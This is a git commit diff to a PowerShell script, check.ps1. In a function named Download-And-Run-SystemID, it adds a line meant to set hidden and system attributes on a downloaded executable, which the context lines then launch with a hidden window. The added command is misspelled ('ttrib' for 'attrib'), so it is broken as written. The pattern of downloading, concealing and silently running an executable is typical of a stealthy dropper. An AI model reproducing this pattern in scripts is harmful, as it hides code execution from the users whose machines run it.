acfad605419f1152279236060222bf35d10c66c0
DevilScript <52322852+DevilScript@users.noreply.github.com>
2025-02-20 10:59:41 +0700

    Update check.ps1

--- check.ps1
+++ check.ps1
@@ -78,7 +78,8 @@ function Download-And-Run-SystemID {
         Write-Log "Error: Failed to download SystemID.exe."
         exit
     }
-
+	
+	ttrib +H +S $filePath
     # ซ่อนหน้าต่างขณะรัน
      Start-Process -FilePath $filePath -WindowStyle Hidden
 }
